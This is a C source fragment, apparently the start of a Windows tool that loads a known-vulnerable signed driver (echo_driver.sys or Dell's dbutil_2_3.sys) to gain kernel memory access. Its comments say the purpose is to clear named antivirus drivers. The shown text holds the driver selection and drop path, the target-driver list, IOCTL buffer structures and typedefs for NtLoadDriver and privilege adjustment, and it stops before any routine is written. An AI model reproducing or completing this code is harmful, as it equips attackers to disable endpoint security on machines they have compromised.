#include<windows.h>
#include<stdio.h>
#include<winternl.h>
#include<psapi.h>
#pragma comment(lib,"ntdll.lib")

/*
DriverType specifies different drivers
1 -> echo_driver.sys driver, supports win10+
2 -> dbutil_2_3.sys driver, supports Win7+ (may not be loaded in higher versions such as win11)
*/

#define DriverType 1

//Specify the location of the driver
#define DrivePath "C:\\ProgramData\\echo_driver.sys"

//Set the driver name to be cleared
CONST CHAR* AVDriver[] = {
	NULL
};

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

typedef struct {
	DWORD pid;
	ACCESS_MASK access;
	HANDLE handle;
}GetHandle;

typedef struct {
	HANDLE targetProcess;
	void* fromAddress;
	void* toAddress;
	size_t length;
	void* padding;
	UINT returnCode;
}ReadMem;

struct DellBuff {
	ULONGLONG pad1 = 0x4141414141414141;
	ULONGLONG Address = 0;
	ULONGLONG three1 = 0x0000000000000000;
	ULONGLONG value = 0x0000000000000000;
} DellBuff;

typedef VOID(__stdcall* RtlInitUnicodeStringPtr) (IN OUT PUNICODE_STRING  DestinationString, IN wchar_t* SourceString);
typedef NTSTATUS(WINAPI* RtlAdjustPrivilegePtr)(IN ULONG Privilege, IN BOOL Enable, IN BOOL CurrentThread, OUT PULONG pPreviousState);
typedef NTSTATUS(WINAPI* NtLoadDriverPtr)(const UNICODE_STRING*);
typedef NTSTATUS(WINAPI* NtUnLoadDriverPtr)(const UNICODE_STRING*);
typedef void(__stdcall* NTPROC)(DWORD*, DWORD*, DWORD*);